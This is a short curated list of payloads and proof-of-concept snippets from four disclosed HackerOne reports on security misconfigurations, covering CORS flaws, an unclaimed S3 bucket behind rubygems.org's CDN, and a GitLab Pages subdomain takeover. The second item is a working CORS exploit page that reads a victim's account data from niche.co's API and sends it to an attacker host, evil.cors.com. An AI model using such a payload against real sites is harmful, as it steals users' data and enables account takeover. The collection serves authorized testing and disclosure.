# Security Misconfiguration  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#426165](https://hackerone.com/reports/426165)  -  [www.zomato.com] CORS Misconfiguration, could lead to disclosure of sensitive information
*medium, $550*

```http
GET /abudhabi HTTP/1.1
Host: www.zomato.com
Referer: https://www.zomato.com/
Cookie: zl=en; fbtrack=0c8f198276217196ed64230da7ec8506; _ga=GA1.2.1887254439.1538912146; _gcl_au=1.…
Origin: developersxzomato.com

## Response
```

## 2. [#426147](https://hackerone.com/reports/426147)  -  CORS misconfig | Account Takeover
*high*

```html
<html>
<body>
<button type='button' onclick='cors()'>CORS</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from niche.co about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://evil.cors.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://www.niche.co/api/v1/users/*******", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```

## 3. [#2262939](https://hackerone.com/reports/2262939)  -  Misconfiguration in AWS CloudFront CDN configuration makes rubygems.org serve (and cache) content from a unclaimed S3-bucket
*medium*

```xml
This XML file does not appear to have any style information associated with it. The document tree is shown below.
<Error>
<Code>NoSuchBucket</Code>
<Message>The specified bucket does not exist</Message>
<BucketName>index.rubygems.org</BucketName>
<RequestId>KF8VDAZNXRZ3S9YQ</RequestId>
<HostId>MgMX9WXs1oJ0Rx8ABtxR+6UHFgVLyoqwqy/CRRPVMjlPLuSFdebn3E2L/8b7ZDL8QyF56JFL004=</HostId>
</Error>
```

## 4. [#2523654](https://hackerone.com/reports/2523654)  -  Subdomain takeover in Gitlab pages
*low*

```
HTTP/1.1 302 Found
content-type: text/html; charset=utf-8
location: https://projects.staging.gitlab.io/auth?domain=http://docs-dev.gitlab.com&state=giZFQTsOOFXvR_0po68zrg==
permissions-policy: interest-cohort=()
set-cookie: gitlab-pages=..._; Path=/auth; Expires=Tue, 28 May 2024 21:07:33 GMT; Max-Age=600; HttpOnly
vary: Origin
date: Tue, 28 May 2024 20:57:33 GMT
gitlab-lb: haproxy-pages-01-lb-gstg
gitlab-sv: pages-us-east1-c

HTTP/2 401 
content-type: text/html; charset=utf-8
permissions-policy: interest-cohort=()
vary: Origin
x-content-type-options: nosniff
content-length: 2872
date: Tue, 28 May 2024 20:57:34 GMT
```
